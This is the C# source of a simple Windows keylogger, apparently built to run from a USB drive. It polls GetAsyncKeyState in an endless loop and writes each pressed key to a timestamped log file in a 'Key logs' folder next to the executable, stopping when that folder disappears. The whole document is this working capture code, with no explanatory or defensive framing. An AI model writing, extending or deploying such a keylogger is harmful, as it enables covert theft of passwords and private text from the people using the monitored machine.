using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace LoggerUSB
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Int32 i);

        static void Main()
        {
            //string usbDriveLabel = "Samsung";
            string exeDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string logDirectory = Path.Combine(exeDirectory, "Key logs");
            string logFilePath = Path.Combine(logDirectory, "Log-" + DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss") + ".txt");

            if (!Directory.Exists(logDirectory))
            {
                Directory.CreateDirectory(logDirectory);
            }

            if (!File.Exists(logFilePath))
            {
                using (StreamWriter sw = File.CreateText(logFilePath))
                {
                    sw.WriteLine("Log File Created: ");
                }
            }

            short keyState;

            while (true)
            {
                System.Threading.Thread.Sleep(5);

                for (int i = 1; i < 127; i++)
                {
                    keyState = GetAsyncKeyState(i);

                    if (keyState == -32767)
                    {
                        Console.Write((char)i);
                        using (StreamWriter sw = File.AppendText(logFilePath))
                        {
                            sw.Write((char)i);
                        }
                    }
                }

                bool exeDirectoryExists = Directory.Exists(exeDirectory);

                if (!exeDirectoryExists)
                {
                    break;
                }
            }
        }
    }
}
